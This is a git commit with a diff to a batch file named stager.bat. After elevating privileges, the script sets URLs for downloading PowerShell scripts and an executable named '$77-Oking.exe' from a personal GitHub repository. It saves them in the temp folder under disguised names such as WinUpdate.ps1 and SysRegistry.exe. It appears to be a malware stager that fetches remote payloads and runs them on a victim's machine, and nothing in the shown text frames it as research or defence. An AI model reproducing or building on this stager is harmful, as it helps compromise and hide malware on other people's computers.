a27b9a368d8a79c4274d60a0f58412d1b82a47ab
Drakovthe6th <drakov1@outlook.com>
2025-07-09 05:40:02 -0800

    milly

--- stager.bat
+++ stager.bat
@@ -31,8 +31,8 @@ if "%1"=="restarted" (
     echo Running with elevated privileges
 
     :: Configure download URLs and file paths
-    set "PS1_URL=https://github.com/Drakovthe6th/TBuG/raw/master/prep.ps1"
-    set "PS1.2_URL=https://github.com/Drakovthe6th/TBuG/raw/master/scanner.ps1"
+    set "PS1_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/prep.ps1"
+    set "PS1.2_URL=https://raw.githubusercontent.com/Drakovthe6th/TBuG/refs/heads/master/scanner.ps1"
     set "EXE_URL=https://github.com/Drakovthe6th/TBuG/raw/master/$77-Oking.exe"
     set "PS1_FILE=%temp%\WinUpdate.ps1"
     set "EXE_FILE=%temp%\SysRegistry.exe"
